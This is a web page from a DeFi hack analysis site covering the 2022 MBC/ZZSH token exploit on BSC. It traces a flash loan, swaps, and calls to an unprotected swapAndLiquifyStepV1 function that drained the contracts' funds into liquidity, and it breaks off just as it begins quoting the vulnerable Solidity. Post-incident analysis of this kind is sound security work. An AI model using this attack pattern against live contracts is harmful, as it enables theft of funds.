
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://autosaida.github.io/DeFiHackAnalysis/2022/221129_MBC/">
      
      
        <link rel="prev" href="../221025_ULME/">
      
      
        <link rel="next" href="../../2023/230119_SHOCO/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
    
    
      
        <title>221129-MBC-ZZSH - DeFiHackAnalysis</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
      
    
    
      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#221129-mbc-zzsh" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="DeFiHackAnalysis" class="md-header__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            DeFiHackAnalysis
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              221129-MBC-ZZSH
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="DeFiHackAnalysis" class="md-nav__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    DeFiHackAnalysis
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2022
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../221025_ULME/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    221025-ULME
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    221129-MBC-ZZSH
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    221129-MBC-ZZSH
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#attacktx" class="md-nav__link">
    <span class="md-ellipsis">
      AttackTx
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AttackTx">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fund-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Fund Flow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#balance-changes" class="md-nav__link">
    <span class="md-ellipsis">
      Balance Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#state-changes" class="md-nav__link">
    <span class="md-ellipsis">
      State Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invocation-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Invocation Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reproduce" class="md-nav__link">
    <span class="md-ellipsis">
      Reproduce
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      Misc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reason-for-profit" class="md-nav__link">
    <span class="md-ellipsis">
      Reason For Profit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#loss" class="md-nav__link">
    <span class="md-ellipsis">
      Loss
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bugs" class="md-nav__link">
    <span class="md-ellipsis">
      Bugs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#frontrunning-protection" class="md-nav__link">
    <span class="md-ellipsis">
      Frontrunning Protection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reference" class="md-nav__link">
    <span class="md-ellipsis">
      Reference
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2023
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            2023
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2023/230119_SHOCO/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230119-SHICO
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2023/230126_TINU/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230126-TINU
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2023/230415_HundredFinance/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230415-HundredFinance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2023/230905_FloorDAO/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230905-FloorDAO
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2023/230905_HeavensGate_JumpFarm_QuantumWN/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230905-HeavensGate-JumpFarm-QuantumWN
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2023/231018_MicDao/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    231018-MicDao
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2023/231206_TIME/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    231206-TIME
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2024
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            2024
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2024/240415_ChaingeFinance/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    240415-ChaingeFinance
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#attacktx" class="md-nav__link">
    <span class="md-ellipsis">
      AttackTx
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AttackTx">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fund-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Fund Flow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#balance-changes" class="md-nav__link">
    <span class="md-ellipsis">
      Balance Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#state-changes" class="md-nav__link">
    <span class="md-ellipsis">
      State Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invocation-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Invocation Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reproduce" class="md-nav__link">
    <span class="md-ellipsis">
      Reproduce
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      Misc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reason-for-profit" class="md-nav__link">
    <span class="md-ellipsis">
      Reason For Profit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#loss" class="md-nav__link">
    <span class="md-ellipsis">
      Loss
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bugs" class="md-nav__link">
    <span class="md-ellipsis">
      Bugs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#frontrunning-protection" class="md-nav__link">
    <span class="md-ellipsis">
      Frontrunning Protection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reference" class="md-nav__link">
    <span class="md-ellipsis">
      Reference
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="221129-mbc-zzsh">221129-MBC-ZZSH</h1>
<h2 id="attacktx">AttackTx</h2>
<p>Analyzing the <a href="https://explorer.phalcon.xyz/tx/bsc/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86">attack transaction</a> using Phalcon.</p>
<h3 id="fund-flow">Fund Flow</h3>
<p><img alt="Fund Flow" src="../../image/221129_MBC.assets/0408.png" /></p>
<p>The attacker initially borrowed around 800k USDT from the DODO pool for the subsequent attack. </p>
<p>The main focus then shifted to two tokens, MBC and ZZSH, with a similar overall logic.</p>
<p><img alt="Fund Flow" src="../../image/221129_MBC.assets/0542.png" /></p>
<p>The attacker used 150k USDT in the Pancake pool to exchange for approximately 10k MBC (2, 6). This involved some transaction fees and burning operations (3, 4, 5). Eventually, the attacker exchanged MBC tokens back for about 155k USDT, resulting in a profit of around 5k USDT (14, 15). </p>
<p>During this period, USDT and MBC tokens are transferred to the pair from the MBC contract (7, 8), and LP tokens are minted (9, 10), indicating that the previous token transfer was to add liquidity to the pool. (The two addresses where LP tokens are minted are <code>feeTo</code> in the factory and <code>tokenOwner</code> in the MBC token)</p>
<p><img alt="Fund Flow" src="../../image/221129_MBC.assets/1153.png" /></p>
<p>Finally, the attacker used MBC tokens to exchange for USDT in the pool (14, 15), obtaining approximately 155k USDT.</p>
<p>A similar logic applies to the ZZSH token, resulting in a net profit of approximately 5.9k USDT.</p>
<p>The root cause of this attack seems to be that both the MBC and ZZSH token contracts themselves held a certain amount of tokens (USDT, MBC, and ZZSH). Additionally, there was an external function with access control flaws that allowed anyone to call the contract to help the <code>tokenOwner</code> add liquidity to the pool.</p>
<h3 id="balance-changes">Balance Changes</h3>
<p><img alt="Balance Changes" src="../../image/221129_MBC.assets/0123.png" /></p>
<p>From the balance changes, it appears that the two token contracts affected by the vulnerability collectively lost approximately 10k USDT (the increase in the quantity of the MBC/ZZSH tokens owned by the contract is likely due to swap fees). In the end, the attacker transferred all the 5.9k USDT in profit to another address.</p>
<h3 id="state-changes">State Changes</h3>
<p><img alt="State Changes" src="../../image/221129_MBC.assets/0811.png" /></p>
<p>Because the attacker used token contract funds to add liquidity, the PancakeSwap pool's <code>totalSupply</code> increased.</p>
<h3 id="invocation-flow">Invocation Flow</h3>
<p>Now let's analyze the internal call details of the transaction.</p>
<p><img alt="Invocation Flow" src="../../image/221129_MBC.assets/1144.png" /></p>
<p>The outermost layer is a DODO protocol flash loan, where funds are borrowed for the subsequent attack.</p>
<p><img alt="Invocation Flow" src="../../image/221129_MBC.assets/1317.png" /></p>
<p>Next, there are operations related to the MBC token, involving transferring 150k USDT to the MBC-USDT pool, then calling the <code>swap</code> function to exchange for MBC tokens. Afterward, the MBC token contract's <code>swapAndLiquifyStepV1</code> function is called, and after a <code>sync</code>, a small amount of USDT (1001/10**18) is transferred to the pool, followed by transferring MBC back to the pool and performing another <code>swap</code>. The vulnerable function here is clearly <code>swapAndLiquifyStepV1</code>, as it performs the liquidity addition operation mentioned earlier.</p>
<p><img alt="Invocation Flow" src="../../image/221129_MBC.assets/2221.png" /></p>
<p>It can be observed that this function then calls the PancakeRouter's <code>addLiquidity</code> function to add liquidity, uses the <code>transferFrom</code> function to make the MBC contract transfer tokens to the pool, and finally, mints LP tokens for <code>tokenOwner</code>. Moreover, it automatically performs a <code>sync</code>, so the attacker doesn't need to manually <code>sync</code>.</p>
<p><img alt="Invocation Flow" src="../../image/221129_MBC.assets/3148.png" /></p>
<p>The ZZSH token follows the same calling process.</p>
<p><img alt="Invocation Flow" src="../../image/221129_MBC.assets/3254.png" /></p>
<p>Finally, the loan is repaid, and the profits are transferred.</p>
<h2 id="vulnerability">Vulnerability</h2>
<p>Now let's analyze the vulnerability in the <a href="https://bscscan.com/address/0x4E87880A72f6896E7e0a635A5838fFc89b13bd17#code">MBC contract</a>.</p>
<p>From the analysis of the attack transaction, we can see that the vulnerability lies in the <code>swapAndLiquifyStepV1</code> function of the contract.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">swapAndLiquifyStepv1</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">ethBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ETH<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
